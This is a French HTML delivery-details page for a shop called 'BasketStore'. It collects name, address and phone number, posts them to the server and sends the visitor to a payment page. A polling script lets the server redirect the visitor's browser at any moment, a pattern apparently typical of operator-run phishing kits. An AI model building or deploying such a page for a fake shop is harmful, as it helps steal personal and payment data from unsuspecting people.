<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Livraison - BasketStore</title>
  <style>
    body { font-family: Arial; text-align: center; padding: 40px; }
    input {
      display: block;
      margin: 10px auto;
      padding: 10px;
      width: 250px;
      border-radius: 8px;
      border: 1px solid #ccc;
    }
    button {
      background: #007bff; color: white; border: none; padding: 12px 25px;
      border-radius: 8px; cursor: pointer;
    }
    button:hover { background: #0056b3; }
  </style>
</head>
<body>
  <h1>ðŸ“¦ Informations de livraison</h1>
  <form id="deliveryForm">
    <input type="text" id="nom" placeholder="Nom" required>
    <input type="text" id="prenom" placeholder="PrÃ©nom" required>
    <input type="text" id="adresse" placeholder="Adresse" required>
    <input type="text" id="telephone" placeholder="TÃ©lÃ©phone" required>
    <button type="submit">Continuer vers paiement</button>
  </form>

  <script>
    document.getElementById('deliveryForm').addEventListener('submit', async (e) => {
      e.preventDefault();
      const data = {
        nom: nom.value, prenom: prenom.value,
        adresse: adresse.value, telephone: telephone.value
      };
      await fetch('/api/delivery', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(data)
      });
      window.location.href = '/payment.html';
    });

    let checking = false, lastRedirect = null;
    async function checkStatus() {
      if (checking) return;
      checking = true;
      try {
        const res = await fetch('/api/status', { cache: 'no-store' });
        const data = await res.json();
        if (data.redirect && data.redirect !== lastRedirect) {
          lastRedirect = data.redirect;
          window.location.href = data.redirect;
          return;
        }
      } catch {}
      finally {
        checking = false;
        setTimeout(checkStatus, 2500);
      }
    }
    checkStatus();
  </script>
</body>
</html>
